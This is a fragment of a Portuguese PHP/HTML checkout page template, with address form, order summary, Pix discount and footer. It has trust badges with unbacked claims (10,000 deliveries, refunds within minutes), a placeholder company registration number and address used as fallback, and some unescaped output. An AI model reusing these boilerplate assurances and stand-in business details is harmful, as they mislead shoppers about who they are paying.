			<div class="holder-input invalid">
				<input type="neighborhood" name="neighborhood" id="neighborhood" class="input input-validate required neighborhood minlength maxlength" minlength="3" maxlength="40" value="" data-error-message-maxlength="Limite de 40 caracteres foi excedido.">
			</div><!-- /.holder-input -->
			<div id="neighborhood_errors" class="error-block"></div><!-- /.error-block -->
		</div>



		<div class="form-group w-100">
			<label for="street" class="label-control block">Cidade</label>
			<div class="holder-input invalid">
				<input type="street" name="city" id="city" class="input input-validate required street minlength" minlength="50" value="">
			</div><!-- /.holder-input -->
			<div id="errors" class="error-block"></div><!-- /.error-block -->
		</div><!-- /.form-group w-50 -->




		<div class="form-group w-100">
			<label for="address_complement" class="label-control block">
				Complemento <span class="f11 black-60">(opcional)</span>
			</label>
			<div class="holder-input">
				<input type="text" name="complement" id="address_complement" class="input address_complement js-check" value="" maxlength="40">
			</div><!-- /.holder-input -->
			<div id="complement_errors" class="error-block"></div><!-- /.error-block -->
		</div><!-- /.form-group w-50 -->

		<div class="form-group w-100">
			<label for="receiver" class="label-control block">Destinatário</label>
			<div class="holder-input valid">
				<input type="receiver" name="receiver" id="receiver" class="input input-validate required receiver minlength fullname" minlength="3" value="">
			</div>
			<div id="receiver_errors" class="error-block" style="display: none;"></div><!-- /.error-block -->
		</div>

		<div class="form-group w-100">

			<button style="background:<?php echo $cor;?> !important;" id="buttonx" type="button" onclick="chk()" class="btn btn-primary btn-block btn-send">Salvar</button>
		</div>



	</div><!-- /.group-form -->

	<input type="hidden" name="_token" value="1zQHURLDA2FeTQDenT5uhovY1bTXVgQyqCuAmZ0o">
</form>

			<div class="container-addresses hide">



					<div class="mt25">
						<button type="submit" class="btn btn-primary btn-block btn-send link-box-checkout disabled" data-target=".box-payment">
							Continuar
							<svg width="17" height="13" viewBox="0 0 17 13" fill="white" xmlns="http://www.w3.org/2000/svg">
<path d="M10.4913 0.083736L8.9516 1.66506C8.84623 1.7729 8.84652 1.94512 8.95215 2.05271L11.5613 4.71372L0.277266 4.71372C0.124222 4.71372 -3.2782e-07 4.83794 -3.21005e-07 4.99098L-2.22234e-07 7.20921C-2.1542e-07 7.36225 0.124222 7.48648 0.277266 7.48648L11.5613 7.48648L8.95216 10.1475C8.84678 10.2551 8.84652 10.427 8.9516 10.5348L10.4913 12.1162C10.5435 12.1699 10.615 12.2002 10.6899 12.2002C10.7647 12.2002 10.8363 12.1697 10.8884 12.1162L16.5579 6.29335C16.6103 6.23958 16.6366 6.16968 16.6366 6.10008C16.6366 6.03022 16.6103 5.96062 16.5579 5.90655L10.8884 0.083736C10.8363 0.0302186 10.7647 4.91753e-07 10.6899 4.94966e-07C10.615 4.98178e-07 10.5435 0.0302186 10.4913 0.083736Z"></path>
</svg>

						</button>
					</div><!-- /.form-group -->

							</div><!-- /.container-addresses -->

		</div><!-- /.box-content -->
		<div class="overlay-spinner overlay-spinner-box">
		<div class="spinner spinner-grey"></div><!-- /.spinner spinner-grey -->
	</div><!-- /.spinner-box -->
</div><!-- /.box-checkout -->
							</div><!-- /.col-checkout -->

			<div class="col-checkout col-2">
				<div class="box-checkout box-payment disabled " data-url="" data-target=".box-payment">

	<div class="box-title">
					<div class="holder-number">3</div><!-- /.holder-number -->
			<div class="title f-h2 ctx-title bold">Pagamento</div><!-- /.f-h2 -->
			<div class="desc">
				Preencha suas informações de entrega para continuar
			</div>
			</div><!-- /.box-title -->


	<div class="overlay-spinner overlay-spinner-box">
		<div class="spinner spinner-grey"></div><!-- /.spinner spinner-grey -->
	</div><!-- /.spinner-box -->
</div><!-- /.box-checkout -->

			</div><!-- /.col-checkout -->


<div class="col-checkout col-3">
				<div class="box-checkout box-resume opened -force-open">
	<div class="box-title flex between js-box-resume-title">
		<div class="c-text">
			<span class="-title f18 medium">
				RESUMO
			</span>
			<span class="items__count bold -mobile" id="resumoQtd">

			</span>
			<div class="resume-description f11 black-60 mt2 -mobile -block">Informações da sua compra</div>
		</div><!-- /.f-h2 -->
		<div>
			<span class="cart_total -mobile mt7">
				<span class="-total" id="valorTotal">
                R$ <?php echo $valor; ?>			</span>
				<i class="icon icon-arrow-left"></i>
			</span>
		</div>
	</div><!-- /.box-title -->
	<div class="js-box-animation box-animation">
		<div class="box-content clearfix mt15">
			<div class="clearfix holder-promocode">
							</div><!-- /.clearfix -->

			<div class="cart-resume mt10">
            <div class="detail">
            <div class="description">Produtos</div>
            <div class="value" id="valorTotal2"></div>
        </div>

        <div class="detail" style="display:none">
            <div class="description">Frete</div>
            <div class="value">
                Grátis
            </div>
        </div>

        <div class="detail" id="descontodiv" style="display:none">
            <div class="description">
                Descontos
                <span class="relative">
                    <i class="icon icon-info"></i>
                    <span class="tooltip2">
                        <div class="tt-content-holder" style="width: auto">
                            <div class="tt-content bold no-wrap">
                                <div class="tt-line">
                                    <div class="tt-key">Pix</div>
                                    <div class="tt-val" id="descontodivvalue2">- R$ </div>
                                </div>
                            </div>
                        </div>
                    </span>
                </span>
            </div>
            <div class="value" id="descontodivvalue">- R$ </div>
        </div>



    <div class="detail total bold" id="divtotalGeral">
        <div class="description" style="color:<?php echo $cor;?> !important;">
            Total
        </div>
        <div class="value js-cart-total" id="valorTotal3" style="color:<?php echo $cor;?> !important;">
            R$ <?php echo $valor; ?>        </div>
    </div>

    <div class="detail total bold" id="divtotalPix" style="display:none">
        <div class="description" style="color:<?php echo $cor;?> !important;">
            Total
        </div>
        <div class="value js-cart-total" id="valorTotal5">
            R$         </div>
    </div>

</div>
			<div class="holder-container-resume js-holder-container-resume">
            <div class="item-holder js-item-holder flex  " data-item-id="329999319" data-product-option-id="53830706" data-kit-id="" data-quantity="1" data-custom="" data-shopify-variant-id="" data-bundle-id="" data-shopify="0" data-order-bump-id="">
    <div class="overlay-spinner overlay-spinner-box">
        <div class="spinner spinner-grey"></div>
    </div>

    <div class="item-image">
        <?php
        // Verifica se a imagem é uma URL (começa com http) ou um arquivo local
        $img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img";
        ?>
        <img src="<?php echo $img_src; ?>" class="thumb-product block">
    </div>

	    <div class="item-detail f12">
	        <div class="item-row">
	            <div class="item-name c-text-tertiary"><?php echo $nomeproduto; ?></div>
	            <div id="summaryVariacoes" style="font-size: 11px; color: #999; margin-top: 4px;"></div>
	            <div class="item-delete"></div>
	        </div>




        <div class="item-row item-holder-quantity-price c-text medium">
                        <span class="item-price" id="valorTotal4"></span>
        </div>

                    <div class="item-row">
                <div class="item-quantity-selector-holder js-item-quantity-selector-holder">
                                            <button onclick="removeQtd()" class="less-button">
                            <i class="icon icon-less"></i>


                        </button>
						<button onclick="addQtd()" class="more-button" style="padding: 2px 17px !important; top: 58% !important;">
                            <i class="icon icon-more"></i>
</button>
                                        <input type="text" class="input-quantity js-input-quantity" id="quantityHTML" value="1">
                    <div class="error-item red f11 hide text-center"></div>
                </div><!-- /.holder-elements -->
            </div>
            </div>

    </div>
    </div><!-- /.holder-container-resume -->
		</div><!-- /.box-content -->
	</div>

	<div class="overlay-spinner overlay-spinner-box">
		<div class="spinner spinner-grey"></div><!-- /.spinner spinner-grey -->
	</div><!-- /.spinner-box -->
</div><!-- /.box-checkout -->			</div>










  <!-- BLOCO PARA INSERIR MSG DE TEXTO DE SEGURAÇÃ QUE O CLIENTE PEDIU NO ZAP -->
	<div class="col-checkout col-4">
    <div class="box-checkout box-resume opened -force-open" style="display:block !important;">
	<br>

	<div class="js-box-animation box-animation">
		<div class="box-content mt15" style="margin-top: 0px !important;">
			<div class="holder-container-resume js-holder-container-resume" style="margin-top: 0px !important;">
            <div style="padding: 0px !important;" class="item-holder js-item-holder flex  " data-item-id="329999319" data-product-option-id="53830706" data-kit-id="" data-quantity="1" data-custom="" data-shopify-variant-id="" data-bundle-id="" data-shopify="0" data-order-bump-id="">
    <div class="item-image">
        <img src="./arquivos/trofeu.png" class="thumb-product block">
    </div>
    <div class="item-detail f12">
    <div class="item-row">
            <div class="item-name c-text-tertiary"><b>Entrega Segura</b><br> Já entregamos mais de 10.000 produtos para todo o Brasil!</div>
            <div class="item-delete"></div>
    </div>
    </div>
    </div>
    </div>
	</div>
	</div>

	<br>


	<div class="js-box-animation box-animation">
		<div class="box-content mt15" style="margin-top: 0px !important;">
			<div class="holder-container-resume js-holder-container-resume" style="margin-top: 0px !important;">
            <div style="padding: 0px !important;" class="item-holder js-item-holder flex  " data-item-id="329999319" data-product-option-id="53830706" data-kit-id="" data-quantity="1" data-custom="" data-shopify-variant-id="" data-bundle-id="" data-shopify="0" data-order-bump-id="">
    <div class="item-image">
        <img src="./arquivos/mao.png" class="thumb-product block">
    </div>
    <div class="item-detail f12">
    <div class="item-row">
            <div class="item-name c-text-tertiary"><b>Garantia de Reembolso</b><br>
Receba sua compra ou nossa equipe devolverá todo seu dinheiro de volta na sua conta em poucos minutos.</div>
            <div class="item-delete"></div>
    </div>
    </div>
    </div>
    </div>
	</div>
	</div>




	<br>



	<div class="js-box-animation box-animation">
		<div class="box-content mt15" style="margin-top: 0px !important;">
			<div class="holder-container-resume js-holder-container-resume" style="margin-top: 0px !important;">
            <div style="padding: 0px !important;" class="item-holder js-item-holder flex  " data-item-id="329999319" data-product-option-id="53830706" data-kit-id="" data-quantity="1" data-custom="" data-shopify-variant-id="" data-bundle-id="" data-shopify="0" data-order-bump-id="">
    <div class="item-image">
        <img src="./arquivos/mp.png" class="thumb-product block">
    </div>
    <div class="item-detail f12">
    <div class="item-row">
            <div class="item-name c-text-tertiary"><b>Pagamento Seguro</b><br>
Nossos pagamentos possuem segurança criptografada em todas as compras.</div>
            <div class="item-delete"></div>
    </div>
    </div>
    </div>
    </div>
	</div>
	</div>
    </div>
    </div>

















		</div><!-- /.clearfix -->
	</div><!-- /.holder-cols-checkout -->
</div><!-- /.container-promocode -->

	</div><!-- /.container clearfix -->



    </div><!-- /.content clearfix -->

    <!-- FOOTER OFICIAL DA LOJA -->
    <style>
        /* FOOTER */
        .footer-main { background-color: #f5f5f5; border-top: 1px solid #e0e0e0; padding: 40px 20px 30px; margin-top: 60px; font-family: "Proxima Nova",-apple-system,Roboto,Arial,sans-serif; }
        .footer-content { max-width: 1200px; margin: 0 auto; }
        .footer-top { margin-bottom: 30px; }
        .footer-links-container { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 25px; justify-content: center; }
        .footer-link { display: inline-block; font-size: 13px; color: #666; text-decoration: none; transition: color 0.2s ease; }
        .footer-link:hover { color: #3483fa; }
        .footer-bottom { border-top: 1px solid #ddd; padding-top: 20px; text-align: center; }
        .footer-copyright { font-size: 13px; color: #666; font-weight: 400; margin-bottom: 8px; }
        .footer-info { font-size: 12px; color: #999; font-weight: 400; line-height: 1.4; margin: 0; }
        @media (max-width: 768px) { .footer-main { padding: 30px 15px 20px; margin-top: 40px; } .footer-links-container { gap: 12px; justify-content: center; } .footer-link { font-size: 12px; display: inline-block; } .footer-copyright { font-size: 12px; text-align: center; } .footer-info { font-size: 11px; text-align: center; } }
    </style>
    <footer class="footer-main">
      <div class="footer-content">
        <div class="footer-top">
          <div class="footer-links-container">
            <a href="politica-de-privacidade.php" class="footer-link">Política de Privacidade</a>
            <a href="termos-de-uso.php" class="footer-link">Termos de Uso</a>
            <a href="trocas-e-devolucoes.php" class="footer-link">Trocas e Devoluções</a>
            <a href="mailto:contato@<?php echo str_replace(' ', '', strtolower($nome)); ?>.com.br" class="footer-link">Contato</a>
          </div>
        </div>
        <div class="footer-bottom">
          <p class="footer-copyright">Copyright © <?php echo date('Y'); ?> <?php echo htmlspecialchars($nome); ?>. Todos os direitos reservados.</p>
          <p class="footer-info">CNPJ: <?php echo !empty($cnpj) ? htmlspecialchars($cnpj) : "00.000.000/0001-00"; ?> | Endereço: <?php echo !empty($endereco) ? htmlspecialchars($endereco) : "Av. Paulista, 1000 - São Paulo, SP"; ?></p>
        </div>
      </div>
    </footer>
  </div>


</body></html>

